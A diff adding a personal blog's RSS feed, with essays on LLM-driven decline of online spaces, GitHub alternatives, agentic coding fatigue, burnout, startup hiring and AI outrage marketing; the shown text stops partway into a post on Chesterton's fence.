@@ -1,0 +1,600 @@
+<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet href="/rss/pretty-feed-v3.xsl" type="text/xsl"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Tao Bojlén</title><description>Software engineering, philosophy, and security.</description><link>https://btao.org/</link><language>en-us</language><item><title>I don&apos;t enjoy the Internet any more</title><link>https://btao.org/posts/2026-08-17-i-dont-enjoy-the-internet/</link><guid isPermaLink="true">https://btao.org/posts/2026-08-17-i-dont-enjoy-the-internet/</guid><description>The pale is growing</description><pubDate>Mon, 17 Aug 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I grew up on the Internet. I spent a significant proportion of my childhood, and later my adult life, on message boards, blogs, social networks, chatrooms, and other online communities. I made friends, found jobs, and was exposed to so many new concepts thanks to the Internet. Many of my core beliefs were sharpened by ideas and discussions I followed online. It&apos;s been a huge part of my life.&lt;/p&gt;
+&lt;p&gt;But today, the joy is largely gone. This wasn&apos;t a sudden change: my experience with the Internet has been getting worse over many years. As it became increasingly monetized, thoughtful knowledge sharing and new ideas started being replaced by an ever-growing volume of attention-seeking, low-quality content. And today, largely thanks to LLMs, the ratio is so skewed that it doesn&apos;t feel worth it.&lt;/p&gt;
+&lt;p&gt;I&apos;m reminded of the video game Disco Elysium (spoilers ahead). In the game, the world is made up of distinct regions called isolas, separated by a nothingness called the pale. The pale is a gradually growing area that degrades information. Venture far enough into it and you&apos;ll be left with a damaged mind. The pale covers most of the world, and some believe that it&apos;ll continue to expand until it envelops everything. This sounds a lot like AI-generated content! On the Internet, we still have a few isolas here and there, but the pale is growing faster than we can handle.&lt;/p&gt;
+&lt;p&gt;I’ve occasionally managed to find isolas of interesting people on social media like Bluesky, but I’m increasingly skeptical of short-form content. Learning about the world through 500-character snippets, or 30-second videos, is not a serious way to engage with knowledge. It triggers our worst instincts in terms of tribalism and groupthink and makes us intellectually lazy. This is true of short-form content whether you&apos;re experiencing it on Instagram, TikTok, X, Mastodon, or something else.&lt;/p&gt;
+&lt;p&gt;Longer-form content like blogs isn&apos;t safe, either. I&apos;ve stopped reading Hacker News because too many stories on the front page are clearly written by an LLM. The writing is bad, and while there &lt;em&gt;might&lt;/em&gt; be an interesting idea in there, it&apos;s equally likely to be empty filler content. The effort of writing an article used to indicate that the author felt they had something worth saying. That&apos;s no longer true. If the author couldn&apos;t be bothered to write it, why should I bother reading it?&lt;/p&gt;
+&lt;p&gt;The final nail in the coffin was work. It&apos;s incredibly hard to get to know the people you&apos;re working with when everyone is slinging LLM outputs to each other. And this isn&apos;t some anti-AI screed -- I&apos;m all-in on agentic software engineering! My issue is with communication more broadly. When you have no sense of what your coworkers believe, or how they think, all the joy and connection of collaboration disappears. I &lt;em&gt;hope&lt;/em&gt; that we&apos;ll collectively decide that it&apos;s rude to pass off LLM writing as your own, but I wouldn&apos;t bet on it.&lt;/p&gt;
+&lt;p&gt;The incentives on the Internet have been skewed for a long time, but there were always isolas of lovely people and high-quality thinking. These isolas are now much harder to find in the pale of slop, and I don&apos;t see a way back.&lt;/p&gt;
+</content:encoded></item><item><title>The forge we deserve</title><link>https://btao.org/posts/2026-05-09-the-forge-we-deserve/</link><guid isPermaLink="true">https://btao.org/posts/2026-05-09-the-forge-we-deserve/</guid><description>Thinking beyond GitHub</description><pubDate>Sat, 09 May 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;GitHub is having a tough time. Their uptime (or rather, lack thereof) has become a meme, they&apos;re facing exponential usage growth thanks to AI, and now high-profile projects like Ghostty are &lt;a href=&quot;https://mitchellh.com/writing/ghostty-leaving-github&quot;&gt;moving away&lt;/a&gt;. Developers are starting to discuss what &lt;a href=&quot;https://matduggan.com/if-i-could-make-my-own-github/&quot;&gt;they&lt;/a&gt; &lt;a href=&quot;https://nesbitt.io/2026/05/02/a-github-for-maintainers.html&quot;&gt;want&lt;/a&gt; from an alternative.&lt;/p&gt;
+&lt;p&gt;I&apos;m thankful for GitHub, but it&apos;s clear which way the winds are blowing. I hope they can fix their stability issues, but this is also an opportunity for the open-source world to try something new. So, what&apos;s next? There are a lot of Git forges out there. Some, like &lt;a href=&quot;https://forgejo.org/&quot;&gt;Forgejo&lt;/a&gt;, are pretty good. It&apos;s reasonable to predict that many people will move to these, and the ecosystem will become more fragmented.&lt;/p&gt;
+&lt;p&gt;There are benefits to centralization, and losing these could be painful. I love that most dev tools I use have a GitHub integration, and there&apos;s almost no friction when I want to open an issue in a GitHub project.&lt;/p&gt;
+&lt;p&gt;This will not be the case in a world of many distinct &lt;code&gt;gitlab.foo.com&lt;/code&gt; and &lt;code&gt;forgejo.bar.com&lt;/code&gt; instances. Or perhaps everyone moves to some hot-new-AI-first-forge, and then we go through the same cycle of enshittification in 10-20 years.&lt;/p&gt;
+&lt;p&gt;But we don&apos;t have to live like this. Armin Ronacher &lt;a href=&quot;https://lucumr.pocoo.org/2026/4/28/before-github/&quot;&gt;puts it well&lt;/a&gt;: it should be harder for one company&apos;s drift to become a cultural crisis for everyone else.&lt;/p&gt;
+&lt;p&gt;I think we already have a promising path ahead: a Git forge built on an open, interoperable protocol.&lt;/p&gt;
+&lt;p&gt;Specifically, today, this is &lt;a href=&quot;https://tangled.org/&quot;&gt;Tangled&lt;/a&gt;. It&apos;s built on the AT Protocol. The details are a little nerdy (I recommend &lt;a href=&quot;https://overreacted.io/open-social/&quot;&gt;this explainer&lt;/a&gt; if you&apos;re interested) but here are the important parts:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Your data (e.g. your repos, the issues you open, the PR comments you write) live on a server you can self-host (or you can use a public, shared server).&lt;/li&gt;
+&lt;li&gt;A centralized app (like tangled.org itself) aggregates everyone&apos;s data in one place.&lt;/li&gt;
+&lt;li&gt;It&apos;s all open-source, so if the Tangled devs start veering off course, we can fork it.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In other words: we get the benefits of a centralized service, &lt;em&gt;and&lt;/em&gt; the benefits that come from owning our own data. You don&apos;t need a million logins and you can still search everyone&apos;s repos from a single search bar, but you also don&apos;t have to entrust the Tangled people with eternal stewardship of your code.&lt;/p&gt;
+&lt;p&gt;The best part of this, in my eyes, is that it is structurally resistant to the lock-in that&apos;s burning us with GitHub. Anyone can run their own Tangled fork, should they wish to. As long as the fork remains compatible with the Tangled schema (called a &lt;a href=&quot;https://atproto.com/guides/lexicon&quot;&gt;lexicon&lt;/a&gt; in ATProto parlance), then it doesn&apos;t matter whether someone reads their profile from &lt;code&gt;tangled.org&lt;/code&gt; or &lt;code&gt;tangled-but-better.org&lt;/code&gt; or even &lt;code&gt;tangled-but-with-some-crazy-different-ui-and-features.com&lt;/code&gt;. A good, early example of this openness is Mitchell Hashimoto&apos;s &lt;a href=&quot;https://tangled.org/mitchellh.com/tack&quot;&gt;tack&lt;/a&gt; -- it lets you use other CI providers within Tangled if you don&apos;t like their native Nix-flavored thing.&lt;/p&gt;
+&lt;p&gt;I want Tangled to do well. Today, it&apos;s alpha software, so some things are rough around the edges -- but it&apos;s definitely usable for open-source work. They&apos;ve raised a &lt;a href=&quot;https://blog.tangled.org/seed/&quot;&gt;seed round&lt;/a&gt;, natively support &lt;a href=&quot;https://blog.tangled.org/stacking/&quot;&gt;jujutsu and stacked PRs&lt;/a&gt;, and just introduced an interesting &lt;a href=&quot;https://blog.tangled.org/vouching/&quot;&gt;web of trust&lt;/a&gt; implementation.&lt;/p&gt;
+&lt;p&gt;From what I&apos;ve seen, it&apos;s the only forge doing something fundamentally different to GitHub. The next forge should be a step up, not sideways. I&apos;m starting all my new projects on Tangled, and I encourage you to try it.&lt;/p&gt;
+</content:encoded></item><item><title>Announcing: Parrot.garden</title><link>https://btao.org/posts/2026-03-22-parrots/</link><guid isPermaLink="true">https://btao.org/posts/2026-03-22-parrots/</guid><description>Repeat your stuff.</description><pubDate>Sun, 22 Mar 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I &lt;a href=&quot;/posts/2026-03-18-one-more-prompt/&quot;&gt;just-one-more-prompt&lt;/a&gt;&apos;ed myself into a new project over the weekend.&lt;/p&gt;
+&lt;p&gt;Introducing &lt;a href=&quot;https://parrot.garden/&quot; target=&quot;_blank&quot;&gt;parrot.garden&lt;/a&gt;, a small tool for indie web authors.
+Post to your own RSS feed, and the parrots will repeat your stuff to Bluesky and Mastodon. I&apos;m using it to cross-post my notes and blog posts
+from this website to social media.&lt;/p&gt;
+&lt;p&gt;This is the &lt;a href=&quot;https://indieweb.org/POSSE&quot;&gt;POSSE&lt;/a&gt; model: Publish on your Own Site, Syndicate Elsewhere.
+Parrot.garden is free to use forever, for everyone: I did the math and it costs me about $0.02 per feed per year,
+if I even manage to exceed Cloudflare&apos;s free tier. No need to self-host anything. It&apos;s also &lt;a href=&quot;https://github.com/taobojlen/parrot.garden&quot;&gt;open source&lt;/a&gt;,
+in case you want to read the vibe-engineered code.&lt;/p&gt;
+</content:encoded></item><item><title>Just one more prompt</title><link>https://btao.org/posts/2026-03-18-one-more-prompt/</link><guid isPermaLink="true">https://btao.org/posts/2026-03-18-one-more-prompt/</guid><description>Agentic coding is addictive</description><pubDate>Wed, 18 Mar 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I love coding with AI. I often have several parallel agents, across multiple projects, running off on various coding errands for me. Like Craig Mod, I&apos;m &lt;a href=&quot;https://craigmod.com/essays/software_bonkers/&quot;&gt;software bonkers&lt;/a&gt;: I just can&apos;t stop building software.&lt;/p&gt;
+&lt;p&gt;But I&apos;m noticing something. After a day of working with Claude, I don&apos;t feel the pleasant tiredness of a day&apos;s work done well. Instead, there&apos;s this jittery craving for &lt;em&gt;more&lt;/em&gt;. It&apos;s the same unsatisfied (and unsatisfiable) hunger that I feel after doomscrolling social media. Just one more TikTok, my reward center demands. Just one more prompt!&lt;/p&gt;
+&lt;p&gt;I&apos;m reminded of a &lt;a href=&quot;https://www.youtube.com/watch?v=vnqBAuehmhM&quot;&gt;scene&lt;/a&gt; in Seinfeld in which Kramer asks George if he ever &lt;em&gt;yearns&lt;/em&gt;. George replies that no, he doesn&apos;t yearn, but he &lt;em&gt;craves&lt;/em&gt;. He craves all the time! I think about this distinction often. In an ideal world, my work would be driven by yearning -- a deep longing to create something useful, beautiful, and right. But, increasingly, the dominant drive seems to be craving -- a craving for the next bug fixed, the next problem solved, the next small dopamine hit of a subtask completed. Yearning has a long time horizon, orienting you towards something that you sense is deeper than you can quite fathom. Craving is immediate, targeted towards some discrete unit, and can never really be fulfilled. I have always found coding addictive. But agentic engineering is making the dopamine so readily available that it&apos;s dangerously exhilarating.&lt;/p&gt;
+&lt;p&gt;For some engineers, agentic engineering has freed them up from the drudgery of writing boilerplate code, dependency updates, repetitive tests, and allowed them to focus on the fun, creative parts. I feel this too! But when even the creative parts are mediated through the same loop, they take on the same craving shape. The fast prompt-response cycle with an eager helper catering to your every whim is the root of the problem -- whether you&apos;re using it for drudgery or for creative tasks.&lt;/p&gt;
+&lt;p&gt;We&apos;re already seeing the most AI-pilled engineers report high levels of &lt;a href=&quot;https://steve-yegge.medium.com/the-ai-vampire-eda6e4f07163&quot;&gt;fatigue&lt;/a&gt; and &quot;&lt;a href=&quot;https://archive.is/hdsM7&quot;&gt;AI brain fry&lt;/a&gt;.&quot; Our brains cannot keep up. I think that we&apos;re going to see more and more scenes of &lt;a href=&quot;https://xcancel.com/mitchellh/status/2031776788532379996&quot;&gt;engineers doomscrolling while their agents work&lt;/a&gt;. Not because those engineers are dumb, or lack self-control, but because agentic coding and doomscrolling share the same highly addictive pattern. You scroll, or write a prompt, and there&apos;s a decent chance your brain gets rewarded with a good Reel or a solved bug! You&apos;re pulling the slot machine lever, over and over. In an environment flooded with cheap dopamine, in and outside work, it&apos;s only going to get harder to resist it.&lt;/p&gt;
+&lt;p&gt;Our curiosity, our ability to go deep, and to do unpleasant-but-ultimately-rewarding things will be challenged every day. Some already argue that the ability to concentrate and do deep work will be a career superpower in the future. That may well be the case. But, more importantly, holding on to our capacity for &lt;em&gt;effort&lt;/em&gt; is going to be crucial not only for employability, but for a rich life.&lt;/p&gt;
+</content:encoded></item><item><title>New Notes RSS feed</title><link>https://btao.org/posts/2026-03-13-notes-rss/</link><guid isPermaLink="true">https://btao.org/posts/2026-03-13-notes-rss/</guid><pubDate>Fri, 13 Mar 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Hello, dear RSS subscriber,&lt;/p&gt;
+&lt;p&gt;I&apos;ve added a new RSS feed for short notes, passing thoughts, and interesting links
+worth sharing. To avoid spamming you, this main feed will contain only my own blog posts going forward.
+No more link posts here!&lt;/p&gt;
+&lt;p&gt;If you&apos;re interested in this new feed, it&apos;s available &lt;a href=&quot;https://btao.org/notes/feed.xml&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;- Tao&lt;/p&gt;
+</content:encoded></item><item><title>The Normie Loop</title><link>https://btao.org/posts/2026-03-11-normie-loop/</link><guid isPermaLink="true">https://btao.org/posts/2026-03-11-normie-loop/</guid><description>On using your time with AI tools wisely</description><pubDate>Wed, 11 Mar 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;m a &lt;a href=&quot;https://technically-your-name-is-on-it.btao.org/taobojlen&quot;&gt;heavy AI user&lt;/a&gt; these days -- most of my commits are co-authored with Claude. My output is much higher than it would be otherwise, and I&apos;m having more fun.&lt;/p&gt;
+&lt;p&gt;Yet in my experience, it doesn&apos;t pay off to follow the bleeding edge of agentic engineering. I don&apos;t doubt that some people get value from Ralph loops or &lt;a href=&quot;https://github.com/obra/superpowers&quot;&gt;Superpowers&lt;/a&gt;, but I can&apos;t help but notice the parallels to productivity influencers who treat optimizing your system as an end in itself.&lt;/p&gt;
+&lt;p&gt;This isn&apos;t to say that there isn&apos;t a lot to learn at the bleeding edge! But it is, by its nature, highly experimental and a lot of the methods won&apos;t stick. We can be thankful to the people writing speculative fiction like Gas Town, but most of us don&apos;t need to think about it in our day-to-day.&lt;/p&gt;
+&lt;p&gt;For most engineers, I recommend the Normie Loop: use Claude Code or Codex or &lt;a href=&quot;https://www.conductor.build/&quot;&gt;Conductor&lt;/a&gt; or whatever, learn to use it well, and talk to the model to steer it as needed. As these tools evolve in response to emerging (but validated) best practices, continue to evolve with them. This is where you get the best ROI.&lt;/p&gt;
+&lt;p&gt;The most useful (and measured) resource I&apos;ve seen so far is Simon Willison&apos;s &lt;a href=&quot;https://simonwillison.net/guides/agentic-engineering-patterns/&quot;&gt;Agentic Engineering Patterns&lt;/a&gt; project.&lt;/p&gt;
+</content:encoded></item><item><title>Everything changes, and nothing changes</title><link>https://btao.org/posts/2026-02-28-everything-changes-nothing-changes/</link><guid isPermaLink="true">https://btao.org/posts/2026-02-28-everything-changes-nothing-changes/</guid><description>Best practices remain remarkably static</description><pubDate>Sat, 28 Feb 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;It&apos;s a strange time to be a software engineer. We&apos;re speedrunning a technical revolution that transforms our industry from one of craftsmanship to &lt;a href=&quot;https://chrisloy.dev/post/2025/12/30/the-rise-of-industrial-software?ref=DenseDiscovery-376&quot;&gt;mass production and cheap code&lt;/a&gt;. This is painful to those who, like me, identified with the art and elegance of programming, and now have to reckon with the fact that we&apos;re no longer artists but just &lt;a href=&quot;https://matduggan.com/i-sold-out-for-200-a-month-and-all-i-got-was-this-perfectly-generated-terraform/#:~:text=You%20know%20what%20the%20difference%20is%20between%20you%20and%20me&quot;&gt;people who type for money&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I&apos;m sympathetic to those who initially rejected the usefulness of LLMs, citing hallucinations and so on, but at some point over the last year it became absurd to hold on to this claim. Today it seems like willful ignorance to reject a future where AI writes &lt;a href=&quot;https://www.youtube.com/watch?v=n1E9IZfvGMA&amp;amp;t=1045s&quot;&gt;90-100% of the code&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Indeed, at the leading AI labs, some engineers &lt;a href=&quot;https://fortune.com/2026/01/29/100-percent-of-code-at-anthropic-and-openai-is-now-ai-written-boris-cherny-roon/&quot;&gt;no longer write any code themselves&lt;/a&gt;. Startups and eventually enterprises are following suit. If your daily routine as a SWE doesn&apos;t already look vastly different than it did in 2022, it soon will. Yet in spite of these rapid changes, I&apos;ve found some relief in the fact that many of the fundamentals are staying the same, at least for now.&lt;/p&gt;
+&lt;p&gt;Software engineering has always &lt;em&gt;really&lt;/em&gt; been about &lt;a href=&quot;https://o16g.com/&quot;&gt;outcomes, not code&lt;/a&gt;. This is why strong engineers spend much of their time thinking about productivity and team coordination. We&apos;re fortunate, because the principles and tools that make a team operate fast also tend to make coding agents work better: small, stacked diffs? Works great for human understanding and also for swarms of agents making concurrent changes. Continuous deployment, automated testing, and easy rollbacks? Already a good idea, and even better when you&apos;re shipping more code than ever before.&lt;/p&gt;
+&lt;p&gt;What makes a good software engineer? I think a lot of it comes down to taste and intuition (often built up through years of experience). This will remain true, though this intuition increasingly operates at the level of architecture rather than individual lines of code. Junior engineers now have to start developing this architectural taste immediately out of the gate, largely sidestepping the need for code-taste. Frontier models are writing ever-cleaner code, especially when paired with a good AGENTS.md to guide them. But they continue to fall short when it comes to understanding and really &lt;em&gt;engaging with&lt;/em&gt; the constraints (both social and technical) that define much of our jobs.&lt;/p&gt;
+&lt;p&gt;I&apos;ve been telling myself that this is enough; that my identity as a builder can remain intact. In the short-to-medium term (&amp;lt;5 years), I&apos;m pretty confident that these principles will hold true. Beyond that, I&apos;m less sure. LLMs can, in theory, automate anything that can be expressed symbolically, and I think that engineering principles, and even taste, can be.&lt;/p&gt;
+&lt;p&gt;Adam Leventhal and Simon Willison coined the term &lt;a href=&quot;https://simonwillison.net/2026/Feb/15/deep-blue/&quot;&gt;&lt;em&gt;Deep Blue&lt;/em&gt;&lt;/a&gt; for the pervasive feeling of dread that many software engineers are sitting with these days. I have days where I feel this deeply. But on other days, when I really lean into this new way of building, it&apos;s hard not to get caught up in the &lt;em&gt;sheer joy&lt;/em&gt; of the insanely fast feedback loop and the feeling of expansiveness you get when you&apos;re orchestrating concurrent agents all building towards something new at once.&lt;/p&gt;
+&lt;p&gt;Not everyone will enjoy this kind of work, and many engineers (especially earlier in their careers) won&apos;t have the experience and professional networks that can cushion the tumult. We&apos;re all living through the &lt;a href=&quot;https://en.wikipedia.org/wiki/Creative_destruction&quot;&gt;creative destruction&lt;/a&gt;. There&apos;s real excitement, but also grief -- and it can be painful to hold both at once.&lt;/p&gt;
+</content:encoded></item><item><title>Introducing RSS-O-Matic</title><link>https://btao.org/posts/2026-02-25-rss-o-matic/</link><guid isPermaLink="true">https://btao.org/posts/2026-02-25-rss-o-matic/</guid><description>Generate RSS feeds for any site or newsletter</description><pubDate>Wed, 25 Feb 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I love RSS feeds, but more and more often I come across blogs that don&apos;t offer one. Rather than go all &lt;a href=&quot;https://knowyourmeme.com/memes/old-man-yells-at-cloud&quot;&gt;old-man-yells-at-cloud&lt;/a&gt; about it, I built a small tool that gives me all the RSS feeds my heart desires.&lt;/p&gt;
+&lt;p&gt;It&apos;s called &lt;a href=&quot;https://rss-o-matic.com/&quot;&gt;RSS-O-Matic&lt;/a&gt; and you can try it out right now. It uses LLMs to generate a feed for any blog/news site that doesn&apos;t already have one. It was very fun to build with Claude!&lt;/p&gt;
+&lt;p&gt;Specifically, the LLM will generate the CSS selectors that we can use to extract the posts/articles from a website. So it only needs to run once, and we can cheaply generate the feed with no further LLM calls (at least until the page changes its design)!&lt;/p&gt;
+&lt;p&gt;Try it out, and let me know what you think!&lt;/p&gt;
+</content:encoded></item><item><title>On Burnout</title><link>https://btao.org/posts/2026-01-16-on-burnout/</link><guid isPermaLink="true">https://btao.org/posts/2026-01-16-on-burnout/</guid><pubDate>Fri, 16 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;It&apos;s been four months since I left my job at a startup. I say &quot;left&quot;, but it was somewhat involuntary: I had worn myself down so much that I couldn&apos;t continue.&lt;/p&gt;
+&lt;p&gt;In hindsight, my approach to work looks more like an addiction. The first sign was when, after a long day at an offsite, a colleague asked me about my interests outside of work and I didn&apos;t have a response. A later, more severe sign was when my sister shared that she felt like she was losing me to my job. I responded by making zero behavioral changes. I had a nervous breakdown in a French château during a company offsite. In the last months before I hit my breaking point, I kept catching persistent colds and was constantly sick. I started smoking because doing something that felt mildly self-destructive helped me cope.&lt;/p&gt;
+&lt;p&gt;For the first month or two of unemployment, I didn&apos;t know how to stop working. I immediately started a new side project and continued as if I was in full-time employment. Once I realized that I wasn&apos;t enjoying it, I instead started planning my next steps. I&apos;d get excited about various startups and business ideas, going so far as talking to VCs and setting up interviews. I quickly realized that it was far too early and had to embarrassingly retreat.&lt;/p&gt;
+&lt;p&gt;Now, it can still be difficult to give myself space to rest. I had forgotten how to, and I&apos;m still learning. The most exciting part has been rediscovering interests like video games and reading fiction, both of which still feel self-indulgent.&lt;/p&gt;
+&lt;p&gt;My love for technology, and my desire to build things, are harder to access but still show up occasionally -- often after too many cups of coffee. It lasts about as long as the caffeine high. On several occasions I&apos;ve become enthusiastic about a new idea and started building, but the excitement only lasts an hour. Then, I notice the familiar feeling of tension and spiking cortisol. An hour of work is repaid with an entire day of lethargy and low mood.&lt;/p&gt;
+&lt;p&gt;I&apos;ve heard that burnout occurs when you have ambition without control. That&apos;s certainly true, and I agree that burnout is largely a &lt;a href=&quot;https://exple.tive.org/blarg/2020/03/18/notice/&quot;&gt;structural problem&lt;/a&gt; -- an avoidable workplace injury. But our own choices factor in: perhaps some people are predisposed to workaholism, and so choosing to stay in a demanding but low-agency role is a bit like an alcoholic choosing to work in a distillery.&lt;/p&gt;
+&lt;p&gt;Burnout isn&apos;t something you can just push through. It&apos;s more like debt: you&apos;re borrowing against a future you&apos;ll eventually have to repay. If you ignore it long enough, then the debt compounds so much that repaying it is its own project. As much as I loved the job that caused my burnout, my biggest regret is not realizing sooner how deep I had gotten.&lt;/p&gt;
+</content:encoded></item><item><title>How to get hired at a startup</title><link>https://btao.org/posts/2025-11-23-how-to-get-hired-at-a-startup/</link><guid isPermaLink="true">https://btao.org/posts/2025-11-23-how-to-get-hired-at-a-startup/</guid><pubDate>Sun, 23 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Our industry is in a weird place right now. Social media is full of software engineers sharing their struggles getting hired (or even getting an interview). There are &lt;a href=&quot;https://lethain.com/career-advice-2025/&quot;&gt;reports&lt;/a&gt; of excellent engineers struggling to find a new role for six months or more. At the same time, employers are lamenting the dearth of talented candidates. It seems that hiring has gotten harder for them, too.&lt;/p&gt;
+&lt;p&gt;How can these two things be happening at the same time? People often point to macro factors like AI. After spending a lot of time on hiring, I have an additional hypothesis: most inbound job applications are not very good. Many applications misunderstand what startups look for.&lt;/p&gt;
+&lt;p&gt;The good news for candidates is that even though a startup might get tens or hundreds of applications a day, it&apos;s not hard to stand out. I spend far longer considering candidates who follow these simple steps.&lt;/p&gt;
+&lt;h2&gt;1. Be a real person&lt;/h2&gt;
+&lt;p&gt;If you&apos;re a real, authentic human applying to a tech company, then good job: you already have a leg up on a lot of the competition.&lt;/p&gt;
+&lt;p&gt;Companies (ranging from startups to Fortune 500s) receive masses of applications from fake remote workers. If hired, these workers funnel wages to illicit operations, including North Korea. We saw a lot of this at Cinder and &lt;a href=&quot;https://www.cinder.co/blog-posts/north-korean-engineers-in-our-application-pile&quot;&gt;wrote about our experience&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In addition, a significant portion of inbound applications are from real people, but are generic. Many job sites make it easy for applicants to apply with a single click, which leads to large volumes of poor-quality applications that employers have to sift through.&lt;/p&gt;
+&lt;p&gt;The lesson here is that employers have to deal with an awful lot of noise in their applicant pool. It doesn&apos;t take much to give them some real signal.&lt;/p&gt;
+&lt;h2&gt;2. Write a real cover letter&lt;/h2&gt;
+&lt;p&gt;The cover letter is the single best place to make yourself memorable. Don&apos;t squander it.&lt;/p&gt;
+&lt;p&gt;There are two major points here: first, if an application form asks for a cover letter, write one! Don&apos;t just upload your CV again. Many applicants do this, but it makes them look lazy and uninterested in the role.&lt;/p&gt;
+&lt;p&gt;Secondly, don&apos;t write a generic cover letter that regurgitates your CV. The cover letter isn&apos;t a box to check, but a chance to tell the company why you&apos;re applying. What motivates you? What kind of work are you drawn to? Why do you want to work for this specific company? If your cover letter only repeats what&apos;s in your CV, then you&apos;re wasting the reader&apos;s time.&lt;/p&gt;
+&lt;p&gt;At a startup, every hire has a significant impact on the culture. It&apos;s also hard work. If you can&apos;t answer these questions, you might prefer a more structured environment than a startup (and that&apos;s fine)!&lt;/p&gt;
+&lt;h2&gt;3. Write for humans&lt;/h2&gt;
+&lt;p&gt;A lot of traditional CV and cover letter advice encourages an overly professional tone. I disagree! Take this made-up example:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I am writing to express my interest in the Software Engineer position. I have experience building reliable, scalable systems, collaborating effectively with cross-functional teams, and delivering high-quality code in fast-paced environments. I am confident my skills and professional approach would allow me to contribute quickly and effectively to your engineering team.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;My eyes glaze over reading it. It&apos;s full of clichés, isn&apos;t tailored to the role, and doesn&apos;t tell me anything about the author. No one actually writes like this, yet the vast majority of cover letters still do.&lt;/p&gt;
+&lt;p&gt;Here&apos;s another example, but far more effective:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Hello! I came across your company via a Reddit thread on durable execution. I wish we&apos;d had this kind of tooling when I worked at FooCorp; it sounds like you&apos;re solving some real problems!&lt;/p&gt;
+&lt;p&gt;I&apos;m a software engineer with a background in fintech. I value simplicity, reliability, and ownership, and I can talk at length about distributed systems. The product you&apos;re building aligns closely with the kind of engineering I care about: reducing accidental complexity and giving teams better primitives for complex workflows.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This is far better. It&apos;s professional but not weirdly formal, it gives a real sense of who the author is, and it&apos;s clear that they are &lt;em&gt;actually&lt;/em&gt; interested in the company. Sincerity is more striking than perfection. You can keep it quite minimal; your only goal is to make the hiring manager want to talk to you.&lt;/p&gt;
+&lt;h2&gt;4. Use AI sensibly&lt;/h2&gt;
+&lt;p&gt;Don&apos;t use AI to write your CV or cover letter. Even if it looks superficially good, you often end up with writing that sounds exactly like every other LLM-written application. They also tend to lie: I&apos;ve seen many AI-written CVs with details that are clearly made-up.&lt;/p&gt;
+&lt;p&gt;However, AI shines for proofreading and general feedback. It&apos;s a good idea to upload your CV/cover letter and ask an LLM if it&apos;s easy to read, has typos, or emphasises the right things. Just be aware that LLMs might try to make your application overly formal, because they&apos;re trained on outdated corporate advice.&lt;/p&gt;
+&lt;p&gt;If there&apos;s one thing to take away, it&apos;s that most inbound applications are noise. If you write clearly and show genuine interest, you can easily end up in the top tier of applicants.&lt;/p&gt;
+</content:encoded></item><item><title>The AI Outrage Machine</title><link>https://btao.org/posts/2025-10-23-outrage-machine/</link><guid isPermaLink="true">https://btao.org/posts/2025-10-23-outrage-machine/</guid><pubDate>Thu, 23 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;A few weeks ago outrage gathered around an &quot;AI actress&quot; called Tilly Norwood, an avatar being pitched to talent agencies as the future of acting. The character was created by Particle6, a UK production company, and everyone hated it.&lt;/p&gt;
+&lt;p&gt;The extensive media coverage, endless think pieces, and condemnations from unions were all predictable. The outcry was far louder and more impactful than its object.&lt;/p&gt;
+&lt;p&gt;We&apos;ve been through the same cycle before with the fictional CGI influencer &lt;a href=&quot;https://en.wikipedia.org/wiki/Miquela&quot;&gt;Lil Miquela&lt;/a&gt;. The account gained millions of followers in 2016. After the initial hubbub died down, every few years Miquela&apos;s writers would manufacture some new controversial storyline, such as claims of assault or severe illness. The details don&apos;t actually matter, as long as it gets attention.&lt;/p&gt;
+&lt;p&gt;This seems to be the case with Tilly Norwood, too. The thought that computers will replace actors and artists scares us so we angrily post about it. But if you look at Particle6&apos;s output, you&apos;ll be struck by just how bad it is -- they&apos;re clearly overselling their product! The longest video on their YouTube channel is a &lt;a href=&quot;https://www.youtube.com/watch?v=3sVO_j4czYs&quot;&gt;painfully unfunny, incoherent, AI-generated sketch&lt;/a&gt;. Anyone could make the same video using commodity AI tools. Someone with a modicum of taste could make a significantly better one.&lt;/p&gt;
+&lt;p&gt;Outrage is a great carrier for attention. The savvy will use this to their advantage, like Friend, who put up &lt;a href=&quot;https://www.theatlantic.com/technology/2025/10/friend-ai-companion-ads/684451/&quot;&gt;provocative ads&lt;/a&gt; for their AI microphone pendant: everyone who vandalized these ads inadvertently became a part of the marketing campaign. The less savvy, like Particle6, unwittingly stumble into the same funnel.&lt;/p&gt;
+&lt;p&gt;So, when the next AI band or AI actress or AI politician is announced: it&apos;s probably crap, and will only go as far as you let it. Block and move on.&lt;/p&gt;
+</content:encoded></item><item><title>Chesterton&apos;s Fence is no more</title><link>https://btao.org/posts/2025-10-13-chestertons-fence/</link><guid isPermaLink="true">https://btao.org/posts/2025-10-13-chestertons-fence/</guid><description>AI-generated code is invalidating this engineering principle.</description><pubDate>Mon, 13 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://en.wiktionary.org/wiki/Chesterton%27s_fence&quot;&gt;Chesterton&apos;s fence&lt;/a&gt; is a useful principle in software engineering (and in life): do not remove a fence until you know why it was put there in the first place. For software engineers, that means a behaviour or a line of code probably exists for a reason; remove it and you may trigger trouble.&lt;/p&gt;
